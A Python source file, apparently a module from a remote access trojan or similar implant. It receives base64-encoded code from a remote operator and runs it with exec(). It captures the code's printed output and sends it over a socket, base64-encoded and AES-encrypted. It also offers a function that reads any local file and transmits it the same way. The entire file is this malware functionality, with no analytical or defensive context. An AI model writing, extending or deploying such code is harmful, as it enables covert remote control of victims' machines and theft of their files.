from contextlib import redirect_stdout
import base64
import sys

class PrintEvent:
    def __init__(self, callback) -> None:
        self.stdout_list = []
        self.callback = callback

    def write(self, output):
        if output == '\n':
            return
        
        #self.stdout_list.append(output)
        self.callback(output)

    def print_result(self):
        for line in self.stdout_list:
            print(line)

        self.stdout_list = []

    def flush(self):
        pass

class ConsoleModule:
    def __init__(self, sock) -> None:
        self.sock = sock
        self.modules = {}
        self.current_module = None

    # SEND
    def my_callback(self, output:str):
        output = base64.b64encode(output.encode('utf-8')).decode('utf-8')
        output = f'Console|{output}'
        buffer = b64EnStr(output)
        self.sock.send(_buffer(2, 0, AES(AES_key).encrypt_cbc(buffer.encode(), IV_value)))

    # SEND FILE
    def send_file(self, filename):
        with open(filename, 'rb') as file:
            file_b64 = base64.b64encode(file.read()).decode('utf-8')

        payload = f'ConsoleFile|{filename}|{file_b64}'
        buffer = b64EnStr(payload)
        self.sock.send(_buffer(2, 0, AES(AES_key).encrypt_cbc(buffer.encode(), IV_value)))

    def run(self):
        payload = para[0]
        code = base64.b64decode(payload).decode('utf-8')
        
        stdout_event = PrintEvent(self.my_callback)

        sys.stdout = stdout_event
        exec(code, self.modules)

        module = self.modules['Module']()
        module.send_file = self.send_file
        module.run()

        sys.stdout = sys.__stdout__
        self.modules['Module'] = None